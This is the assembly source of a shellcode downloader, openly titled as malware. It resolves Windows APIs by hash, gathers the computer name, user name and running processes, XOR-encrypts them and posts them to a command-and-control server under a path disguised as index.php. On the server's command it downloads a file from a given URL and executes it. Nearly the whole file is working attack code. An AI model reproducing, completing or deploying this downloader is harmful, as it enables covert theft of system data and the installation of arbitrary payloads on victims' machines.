;Elvis proundly to present
;The Tiny downloader
;Shellcode malware

.386
.model flat, stdcall
option casemap:none

include 		kernel32.inc
include		user32.inc
include		windows.inc
include		define.inc


includelib		kernel32.lib
includelib		user32.lib

API_Array struct
	;Kernel32 part
	;NUM_OF_KERNEL32_API
	pLoadLibrary					dd		?
	pGetProcAddress				dd		?
	pGlobalAlloc					dd		?
	pGlobalFree					dd		?
	pCreateToolhelp32Snapshot		dd		?
	pProcess32First				dd		?
	pProcess32Next				dd		?
	pCloseHandle					dd		?
	pSleep						dd		?
	pGetComputerName			dd		?
	pExpandEnvironmentStrings		dd		?
	
	;WinHttp part
	;NUM_OF_WINHTTP_API
	pWinHttpOpen					dd		?
	pWinHttpConnect				dd		?
	pWinHttpOpenRequest			dd		?
	pWinHttpSendRequest			dd		?
	pWinHttpCloseHandle			dd		?
	pWinHttpReceiveResponse		dd		?
	pWinHttpQueryDataAvailable		dd		?
	pWinHttpReadData				dd		?
	
	;Shell32 part
	;NUM_OF_SHELL32_API
	pShellExecute					dd		?
	
	;Advapi32 part
	;NUM_OF_ADVAPI32_API	
	pGetUserName				dd		?
	
	;Urlmon part
	;NUM_OF_URLMON_API
	pURLDownloadToFile			dd		?
	
	;Wininet
	;NUM_OF_WININET_API
	pDeleteUrlCacheEntry			dd		?
	
API_Array EndS

SecuredPostData		proto :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
GetComputerData		proto: DWORD, :DWORD
GetProcessList		proto :DWORD, :DWORD
MainProgram			proto :DWORD, :DWORD
API_Init				proto :DWORD
Load_API_From_Base	proto :DWORD, :DWORD, :DWORD
Xor_Enc				proto :DWORD, :DWORD, :BYTE
memset				proto :DWORD, :BYTE, :DWORD

.data

.data?

.const
NUM_OF_KERNEL32_API		equ		11
NUM_OF_WINHTTP_API			equ		8
NUM_OF_SHELL32_API			equ		1
NUM_OF_ADVAPI32_API			equ		1
NUM_OF_URLMON_API			equ		1
NUM_OF_WININET_API			equ		1

MAX_BUFFER_SIZE				equ		SIZE_OF_HEADER + SIZE_OF_DATA
SIZE_OF_HEADER				equ		9
SIZE_OF_DATA				equ		500h

POST_KEY					equ		0EBh
RECV_KEY					equ		0BEh

.code
start:
	cld
	call		Get_Data_Ptr
	;store bundle of API here. Follow the API_Array struct
	;Kernel32
	dd		0348BF434h, 070B7098h, 0269D395Ah, 08CD14C91h, 09696B34Eh, 0CA526DEAh, 0FE63E981h, 0A3BCCA20h, 0FA920757h, 03F80B76Fh, 0A6CD011Eh
	;WinHttp
	dd		0C99B39FEh, 0AA1C76F6h, 03AF183C7h, 01BDC49Fh, 0865BD6CEh, 01FFC679Eh, 067113E5Dh, 0A4A64982h
	;Shell32
	dd		0A663AC4Ah
	;Advapi32
	dd		0708FAE7Fh
	;Urlmon
	dd		01E23CFEDh
	;Wininet
	dd		069EDB96Bh
Get_Data_Ptr:
	pop		esi
	invoke	API_Init, esi
	.if eax == 0
		ret
	.endif
	push	esi
	call		Push_CnC
dw	"l", "o", "c", "a", "l", "h", "o", "s", "t",0
dw	50		dup (0)
Push_CnC:
	call		MainProgram
	xor		eax, eax
	ret

memset proc uses esi edi buffer:DWORD, value:BYTE, num:DWORD
	mov		ecx, num
	mov		al, value
	mov		edi, buffer
	rep stosb
	mov		eax, buffer
	ret
memset EndP

SecuredPostData proc uses esi edi Url_Ptr:DWORD, Path:DWORD, Data:DWORD, Data_Length:DWORD, Recv_Data:DWORD, Recv_Data_Length_Ptr:DWORD, API_Ptr:DWORD
	local		hSession: DWORD
	local		hConnect: DWORD
	local		hRequest: DWORD
	local		dwDownload:DWORD
	
	mov		esi, API_Ptr
	assume esi: ptr API_Array
	
	;Clear local variable
	xor		eax, eax
	mov		hSession, eax
	mov		hConnect, eax
	mov		hRequest, eax
	mov		dwDownload, 0
	mov		edx, Recv_Data_Length_Ptr		;Clear Recv_Data_Length_Ptr
	xor		eax, eax
	mov		dword ptr [edx], eax
	
	;Encrypt data before post to server with key is 0xEB
	invoke	Xor_Enc, Data, Data_Length, POST_KEY
	
	push	0
	push	WINHTTP_NO_PROXY_BYPASS
	push	WINHTTP_NO_PROXY_NAME
	push	WINHTTP_ACCESS_TYPE_DEFAULT_PROXY
	call		Push_User_Agent
dw	"M", "o", "z", "i", "l", "l", "a", "/", "4", ".", "0", " ", "(", "c", "o", "m", "p", "a", "t", "i", "b", "l", "e", ";", " "
dw	"M", "S", "I", "E", " ", "9", ".", "0", ";", " ", "W", "i", "n", "d", "o", "w", "s", " ", "N", "T", " ", "6", ".", "1", ")",0
Push_User_Agent:
	call		[esi].pWinHttpOpen
	.if eax == 0
		jmp		Exit
	.endif
	mov		hSession, eax
	push	0
	push	INTERNET_DEFAULT_HTTP_PORT
	push	Url_Ptr
	push	eax
	call		[esi].pWinHttpConnect
	.if eax == 0
		jmp		Free_And_Exit
	.endif
	mov		hConnect, eax
	push	0
	push	WINHTTP_DEFAULT_ACCEPT_TYPES
	push	WINHTTP_NO_REFERER
	push	NULL
	push	Path
	call		Push_POST
dw	"P", "O", "S", "T", 0
Push_POST:
	push	eax
	call		[esi].pWinHttpOpenRequest
	.if eax == 0
		jmp		Free_And_Exit
	.endif
	mov		hRequest, eax
	push	0
	push	Data_Length
	push	Data_Length
	push	Data
	push	0
	push	WINHTTP_NO_ADDITIONAL_HEADERS
	push	eax
	call		[esi].pWinHttpSendRequest
	.if eax == 0
		jmp		Free_And_Exit
	.endif
	push	NULL
	push	hRequest
	call		[esi].pWinHttpReceiveResponse
	.if eax == 0
		jmp		Free_And_Exit
	.endif
	
	;Because max buffer is 500h.
	;So no loop at all
	push	Recv_Data_Length_Ptr
	push	hRequest
	call		[esi].pWinHttpQueryDataAvailable
	.if eax == 0
		jmp		Free_And_Exit
	.endif
	
	;Check if data length is > MAX_BUFFER_SIZE
	mov		edx, Recv_Data_Length_Ptr
	mov		eax, dword ptr [edx]
	.if eax > SIZE_OF_DATA
		;ignore this packet
		xor		eax, eax
		mov		dword ptr [edx], eax
		jmp		Free_And_Exit
	.endif
	
	lea		eax, dwDownload
	push	eax
	push	dword ptr [edx]
	push	Recv_Data
	push	hRequest
	call		[esi].pWinHttpReadData
	.if eax == 0
		;Failed to read data
		mov		edx, Recv_Data_Length_Ptr
		xor		eax, eax
		mov		dword ptr [edx], eax
	.endif
	
	;Decrypt data from server
	mov		edx, Recv_Data_Length_Ptr
	mov		eax, dword ptr [edx]
	invoke	Xor_Enc, Recv_Data, eax, RECV_KEY
	
Free_And_Exit:
	mov		eax, hSession
	.if eax != 0
		push	eax
		call		[esi].pWinHttpCloseHandle
	.endif
	mov		eax, hConnect
	.if eax != 0
		push	eax
		call		[esi].pWinHttpCloseHandle
	.endif
	mov		eax, hRequest
	.if eax != 0
		push	eax
		call		[esi].pWinHttpCloseHandle
	.endif
	
Exit:
	xor		eax, eax
	ret
SecuredPostData EndP

GetProcessList proc uses esi edi Buffer:DWORD, API_Ptr:DWORD
	;function return length of data
	local		hProcessSnap:DWORD
	local		cursor:DWORD
	local		pe32:PROCESSENTRY32
	
	;First clear memory of pe32
	lea		eax, pe32
	invoke	memset, eax, 0, sizeof PROCESSENTRY32
	
	;prepare cursor = Buffer
	push	Buffer
	pop		cursor
	
	mov		esi, API_Ptr
	assume esi: ptr API_Array
	push	0
	push	TH32CS_SNAPPROCESS
	call		[esi].pCreateToolhelp32Snapshot
	.if eax == INVALID_HANDLE_VALUE
		xor		eax, eax
		ret
	.endif
	mov		hProcessSnap, eax
	mov 		pe32.dwSize, sizeof PROCESSENTRY32
	lea		eax, pe32
	push	eax
	push	hProcessSnap
	call		[esi].pProcess32First
	.if eax == ERROR_NO_MORE_FILES
		jmp		End_Process_Loop
	.endif
	
	.repeat
		lea		edx, pe32.szExeFile
		mov		ecx, cursor
		.while byte ptr [edx] != 0
			mov		al, byte ptr [edx]
			mov		byte ptr [ecx], al
			inc		ecx
			inc		edx
		.endw
		mov		byte ptr [ecx], '/'
		inc 		ecx
		mov		cursor, ecx
		
		lea		eax, pe32
		push	eax
		push	hProcessSnap
		call		[esi].pProcess32Next
	.until eax != TRUE
	push	hProcessSnap
	call		[esi].pCloseHandle
	mov		eax, cursor
	mov		byte ptr [eax-1], 0			;Clear last '/'
	sub		eax, Buffer
	ret
End_Process_Loop:
	push	hProcessSnap
	call		[esi].pCloseHandle
	xor		eax, eax
	ret
GetProcessList EndP

GetComputerData proc uses esi Buffer:DWORD, API_Ptr:DWORD
	;return length of data
	local		tmp:DWORD, Computer_Name_Length: DWORD
	mov		esi, API_Ptr
	assume esi: ptr API_Array
	lea		eax, tmp
	push	eax
	push	Buffer
	call		[esi].pGetComputerName
	.if eax == 0
		mov		tmp, 0
	.endif
	mov		edx, tmp
	push	tmp
	pop		Computer_Name_Length
	mov		eax, Buffer
	lea		edx, [eax + edx]
	mov		byte ptr [edx], '/'
	inc 		edx
	lea		eax, tmp
	push	eax				;
	push	edx				;
	call		[esi].pGetUserName
	.if eax == 0
		mov		tmp, 0
	.endif
	mov		eax, Computer_Name_Length
	add		eax, tmp
	inc		eax
	ret
GetComputerData EndP

MainProgram proc Enc_CnC:DWORD, API_Ptr: DWORD
	local		BufferSend	:DWORD
	local		BufferRecv	:DWORD
	local		Recv_Length	:DWORD
	local		Submit_Path	:DWORD
	local		hwid			:DWORD
	
	;Clear some local variable
	xor		eax, eax
	mov		BufferSend, eax
	mov		BufferRecv, eax
	
	mov		esi, API_Ptr
	assume esi: ptr API_Array
	
	push	MAX_BUFFER_SIZE
	push	GPTR
	call		[esi].pGlobalAlloc
	mov		BufferSend, eax
	.if eax == 0
		xor		eax, eax
		ret
	.endif
	
	push	MAX_BUFFER_SIZE	
	push	GPTR
	call		[esi].pGlobalAlloc
	mov		BufferRecv, eax
	.if eax == 0
		jmp		break
	.endif
	
	;prepare C&C path
	call		Push_Submit_Path
dw	"/", "i", "n", "d", "e", "x", ".", "p", "h", "p",0					;look legit ;)
Push_Submit_Path:
	pop		Submit_Path
	
	;OK we need hwid. Hash the computername/username
	invoke	GetComputerData, BufferSend, esi
	push	BufferSend
	call		@DJB_Hash
	add		esp, 4
	mov		hwid, eax
	
	.while(TRUE)
		;Get Computer data
		;Prepare header
		invoke	memset, BufferSend, 0, MAX_BUFFER_SIZE
		mov		eax, BufferSend
		mov		dword ptr [eax], 0CAFEBABEh			;header = 0xCAFEBABE
		add		eax, 4
		mov		byte ptr [eax], 0						;id = 0 -> heart beat
		inc		eax
		push	hwid
		pop		dword ptr [eax]
		add		eax, 4
		invoke	GetComputerData,eax, esi
		push	eax				;save data size
		
		;POST to server
		;TOTO: Write code here
		invoke	memset, BufferRecv, 0, MAX_BUFFER_SIZE
		pop		eax
		add		eax, SIZE_OF_HEADER
		lea		edx, Recv_Length
		invoke	SecuredPostData, Enc_CnC, Submit_Path, BufferSend, eax, BufferRecv, edx, API_Ptr
		
		;Now dispatch command from C&C
		mov		edx, BufferRecv
		mov		eax, dword ptr [edx]
		.if eax == 0CAFEBABEh
			add		edx, 4
			mov		al, byte ptr [edx]
			.if al == 0
				;OK. Do nothing
			.elseif al == 1
				;Download and execute
				;packet data struct
				;DWORD: Size of uel
				;BYTE[]: Url
				;DWORD: Size of save path
				;BYTE[]: Saved path (with or without environment string)
				
				;Very complex ASM :)
				inc		edx
				mov		eax, dword ptr [edx]	;size of url
				add		edx, 4
				
				;call UrlDownloadToFile
				push	NULL
				push	0
				push	BufferSend
				push	edx				;push url
					;call DeleteUrlCacheEntry
					push	edx				;push url
					lea		ecx, [eax + edx]
					xor		eax, eax
					mov		dword ptr [ecx], eax	;clear size of save path. We do not need this
					add		ecx, 4			;ecx pointer to save path
						;Call ExpandEnvironmentStrings
						push	MAX_BUFFER_SIZE - 1
						push	BufferSend
						push	ecx
							;call memset
							invoke	memset, BufferSend, 0, MAX_BUFFER_SIZE 
						call		[esi].pExpandEnvironmentStrings
						.if eax == 0
							add		esp, 20
							jmp		End_Dispatch
						.endif
					call		[esi].pDeleteUrlCacheEntry
				push	NULL
				call		[esi].pURLDownloadToFile
				.if eax == S_OK
					push	SW_SHOWDEFAULT			;Default or hide?
					push	NULL
					push	NULL
					push	BufferSend
					call		Push_open
db	'open',0
Push_open:
					push	NULL
					call		[esi].pShellExecute
				.endif
			.endif
		.endif
End_Dispatch:

		push	10000			;10 seconds sleep
		call		[esi].pSleep
		
		;Get Process list
		;Preapare header
		invoke	memset, BufferSend, 0, MAX_BUFFER_SIZE
		mov		eax, BufferSend
		mov		dword ptr [eax], 0CAFEBABEh			;header = 0xCAFEBABE
		add		eax, 4
		mov		byte ptr [eax], 1						;id = 1 -> process list
		inc		eax
		push	hwid
		pop		dword ptr [eax]
		add		eax, 4
		invoke	GetProcessList, eax, esi
		push	eax
		
		;POST to server
		;TOTO: Write code here
		invoke	memset, BufferRecv, 0, MAX_BUFFER_SIZE
		pop		eax
		add		eax, SIZE_OF_HEADER
		lea		edx, Recv_Length
		invoke	SecuredPostData, Enc_CnC, Submit_Path, BufferSend, eax, BufferRecv, edx, API_Ptr
		
		push	30000			;30 seconds sleep
		call		[esi].pSleep
	.endw
break:
	.if BufferSend != 0
		push	BufferSend
		call		[esi].pGlobalFree
	.endif
	
	.if BufferRecv != 0
		push	BufferRecv
		call		[esi].pGlobalFree
	.endif
	ret
MainProgram EndP

API_Init proc uses esi API_Ptr:DWORD
	;First get the kernel32 base
	;Thank to: https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/
	;P/s: I heard some people said that 3rd module might be replaced by AV's dll. Gonna improve some day :)
	local cnt:DWORD
	assume fs:nothing
	xor		ecx, ecx
	mov		cnt, ecx
	mov 		eax, fs:[ecx + 30h]  	; EAX = PEB
	mov 		eax, [eax + 0Ch]      	; EAX = PEB->Ldr
	mov 		esi, [eax + 14h]    	; ESI = PEB->Ldr.InMemOrder
	lodsd                     			; EAX = Second module
	xchg 	eax, esi             		; EAX = ESI, ESI = EAX
	lodsd                     			; EAX = Third(kernel32)
	mov 		ebx, [eax + 10h]     	; EBX = Base address
	;Call function to load API
	invoke	Load_API_From_Base, API_Ptr, NUM_OF_KERNEL32_API, ebx
	.if eax == 0
		jmp		Failed
	.endif
	
	call		Push_WinHttp_Dll
db	'Winhttp.dll',0
Push_WinHttp_Dll:
	assume esi: ptr API_Array
	mov		esi, API_Ptr
	call		[esi].pLoadLibrary
	.if eax == 0
		;Can't load Winhttp.dll
		jmp		Failed
	.endif
	mov		ebx, eax
	mov		eax, esi
	add		eax, NUM_OF_KERNEL32_API*4
	invoke	Load_API_From_Base, eax, NUM_OF_WINHTTP_API, ebx
	.if eax == 0
		jmp		Failed
	.endif
	call		Push_Shell32_Dll
db	'Shell32.dll',0
Push_Shell32_Dll:
	call		[esi].pLoadLibrary
	.if eax == 0
		;Can't load Shell32.dll
		jmp		Failed
	.endif
	mov		ebx, eax
	mov		eax, esi
	add		eax, (NUM_OF_KERNEL32_API*4 + NUM_OF_WINHTTP_API*4)
	invoke	Load_API_From_Base, eax, NUM_OF_SHELL32_API, ebx
	.if eax == 0
		jmp		Failed
	.endif
	
	call		Push_Advapi32_Dll
db	'Advapi32.dll',0
Push_Advapi32_Dll:
	call		[esi].pLoadLibrary
	.if eax == 0
		;Can't load Advapi32.dll
		jmp		Failed
	.endif
	mov		ebx, eax
	mov		eax, esi
	add		eax, (NUM_OF_KERNEL32_API*4 + NUM_OF_WINHTTP_API*4 + NUM_OF_SHELL32_API*4)
	invoke	Load_API_From_Base, eax, NUM_OF_ADVAPI32_API, ebx
	.if eax == 0
		jmp		Failed
	.endif
	
	call		Push_Urlmon_Dll
db	'Urlmon.dll',0
Push_Urlmon_Dll:
	call		[esi].pLoadLibrary
	.if eax == 0
		;Can't load Urlmon.dll
		jmp		Failed
	.endif
	mov		ebx, eax
	mov		eax, esi
	add		eax, (NUM_OF_KERNEL32_API*4 + NUM_OF_WINHTTP_API*4 + NUM_OF_SHELL32_API*4 + NUM_OF_ADVAPI32_API*4)
	invoke	Load_API_From_Base, eax, NUM_OF_URLMON_API, ebx
	.if eax == 0
		jmp		Failed
	.endif
	
	call		Push_Wininet_Dll
db	'Wininet.dll',0
Push_Wininet_Dll:
	call		[esi].pLoadLibrary
	.if eax == 0
		;Can't load wininet.dll
		jmp		Failed
	.endif
	mov		ebx, eax
	mov		eax, esi
	add		eax, (NUM_OF_KERNEL32_API*4 + NUM_OF_WINHTTP_API*4 + NUM_OF_SHELL32_API*4 + NUM_OF_ADVAPI32_API*4 + NUM_OF_URLMON_API*4)
	invoke	Load_API_From_Base, eax, NUM_OF_WININET_API, ebx
	.if eax == 0
		jmp		Failed
	.endif
	
	xor		eax, eax
	mov		al, 1
	ret
Failed:
	xor		eax, eax
	ret
API_Init EndP

Load_API_From_Base proc uses esi ebx API_Ptr:DWORD, NumOfAPI:DWORD, ModuleBase:DWORD
	local 	cnt:DWORD
	
	xor		eax, eax
	mov		cnt, eax
	mov		ebx, ModuleBase
	mov		esi, API_Ptr
Get_API_Loop_Start:
	lodsd
	mov		ecx, cnt
	.if ecx < NumOfAPI
		push	eax			;API checksum/hash
		push	ebx			;kernel32 base
		call		Get_API_By_Checksum		;Not a stdcall so add esp, 8
		add		esp, 8
		.if eax == 0
			;Failed to find API :(
			xor		eax, eax
			ret
		.endif
		mov		dword ptr [esi - 4], eax
		inc		cnt
		jmp		Get_API_Loop_Start
	.endif
	xor		eax, eax
	mov		al, 1
	ret
Load_API_From_Base EndP

Xor_Enc proc uses esi ebx Buffer: DWORD, BufferSize: DWORD, Key: BYTE
	xor		ecx, ecx
	mov		al, Key
	mov		edx, Buffer
	.while ecx < BufferSize
		mov		bl, byte ptr [edx + ecx]
		xor		al, bl
		mov		byte ptr [edx + ecx], al
		inc		ecx
	.endw
	ret
Xor_Enc EndP

;RIpped code part
;Compile to C++ then .... RIP

;DJB Hash
@DJB_Hash:
	push ebp
	mov ebp, esp
	push ecx
	mov dword ptr ss:[ebp-4h], 0CAFEBABEh
	jmp short @L_00181846

@L_0018183D:
	mov eax, dword ptr ss:[ebp+8h]
	add eax, 1h
	mov dword ptr ss:[ebp+8h], eax

@L_00181846:
	mov ecx, dword ptr ss:[ebp+8h]
	movsx edx, byte ptr ds:[ecx]
	test edx, edx
	je short @L_00181866
	mov eax, dword ptr ss:[ebp-4h]
	shl eax, 5h
	add eax, dword ptr ss:[ebp-4h]
	mov ecx, dword ptr ss:[ebp+8h]
	movsx edx, byte ptr ds:[ecx]
	add eax, edx
	mov dword ptr ss:[ebp-4h], eax
	jmp short @L_0018183D

@L_00181866:
	mov eax, dword ptr ss:[ebp-4h]
	mov esp, ebp
	pop ebp
	ret

;Get API By checksum
;Totally not a std call
Get_API_By_Checksum:
	push ebp
	mov ebp, esp
	sub esp, 14h
	cmp dword ptr ss:[ebp+8h], 0h
	je @L00000004
	mov eax, dword ptr ss:[ebp+8h]
	mov ecx, dword ptr ds:[eax+3Ch]
	mov edx, dword ptr ss:[ebp+8h]
	mov eax, dword ptr ss:[ebp+8h]
	add eax, dword ptr ds:[edx+ecx*1h+78h]
	mov dword ptr ss:[ebp-0Ch], eax
	mov ecx, dword ptr ss:[ebp-0Ch]
	mov edx, dword ptr ss:[ebp+8h]
	add edx, dword ptr ds:[ecx+20h]
	mov dword ptr ss:[ebp-10h], edx
	mov eax, dword ptr ss:[ebp-0Ch]
	mov ecx, dword ptr ss:[ebp+8h]
	add ecx, dword ptr ds:[eax+24h]
	mov dword ptr ss:[ebp-8h], ecx
	mov edx, dword ptr ss:[ebp-0Ch]
	mov eax, dword ptr ss:[ebp+8h]
	add eax, dword ptr ds:[edx+1Ch]
	mov dword ptr ss:[ebp-14h], eax
	mov ecx, dword ptr ss:[ebp-0Ch]
	mov edx, dword ptr ds:[ecx+18h]
	mov dword ptr ss:[ebp-4h], edx
	mov dword ptr ss:[ebp-4h], 0h
	jmp short @L00000002

@L00000001:
	mov eax, dword ptr ss:[ebp-4h]
	add eax, 1h
	mov dword ptr ss:[ebp-4h], eax

@L00000002:
	mov ecx, dword ptr ss:[ebp-0Ch]
	mov edx, dword ptr ss:[ebp-4h]
	cmp edx, dword ptr ds:[ecx+18h]
	jae short @L00000004
	mov eax, dword ptr ss:[ebp-4h]
	mov ecx, dword ptr ss:[ebp-10h]
	mov edx, dword ptr ds:[ecx+eax*4h]
	add edx, dword ptr ss:[ebp+8h]
	push edx
	call @DJB_Hash
	add esp, 4h
	cmp eax, dword ptr ss:[ebp+0Ch]
	jne short @L00000003
	mov eax, dword ptr ss:[ebp-4h]
	mov ecx, dword ptr ss:[ebp-8h]
	movzx edx, word ptr ds:[ecx+eax*2h]
	mov eax, dword ptr ss:[ebp-14h]
	mov eax, dword ptr ds:[eax+edx*4h]
	add eax, dword ptr ss:[ebp+8h]
	jmp short @L00000005

@L00000003:
	jmp short @L00000001

@L00000004:
	xor eax, eax

@L00000005:
	mov esp, ebp
	pop ebp
	ret

end start